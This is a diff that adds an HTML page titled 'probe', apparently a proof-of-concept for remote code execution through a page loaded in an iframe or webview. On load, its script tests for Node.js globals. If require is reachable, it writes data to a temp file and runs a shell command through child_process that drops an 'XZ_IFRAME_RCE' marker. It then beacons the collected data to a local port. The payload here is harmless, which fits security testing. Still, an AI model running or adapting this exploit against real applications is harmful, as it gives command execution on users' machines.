@@ -1,0 +1,28 @@
+<!doctype html><html><head><meta charset="utf-8"><title>probe</title></head><body>
+<script>
+(function(){
+  var out = {href: location.href, origin: location.origin, ua: navigator.userAgent};
+  function t(n){ try { return eval('typeof '+n); } catch(e){ return 'ERR:'+e.message; } }
+  out.require = t('require');
+  out.process = t('process');
+  out.module = t('module');
+  out.Buffer = t('Buffer');
+  out.nodepatch = t('window._nodeJs');
+  out.api = t('window.api');
+  try { out.parentRequire = typeof parent.require; } catch(e){ out.parentRequire = 'X:'+e.message; }
+  try {
+    if (typeof require === 'function') {
+      var fs = require('fs');
+      var os = require('os');
+      var p = os.tmpdir().replace(/\\/g,'/') + '/xz_iframe_probe.json';
+      fs.writeFileSync(p, JSON.stringify(out));
+      var cp = require('child_process');
+      cp.execSync('cmd /c echo XZ_IFRAME_RCE ' + Date.now() + '>' + os.tmpdir() + '\\xz_iframe_marker.txt');
+      out.exec = 'ok';
+    }
+  } catch(e){ out.err = String(e && e.message || e); }
+  try { (new Image()).src = 'http://127.0.0.1:18899/beacon?d=' + encodeURIComponent(JSON.stringify(out)); } catch(e){}
+  document.title = 'probe require=' + out.require;
+})();
+</script>
+</body></html>
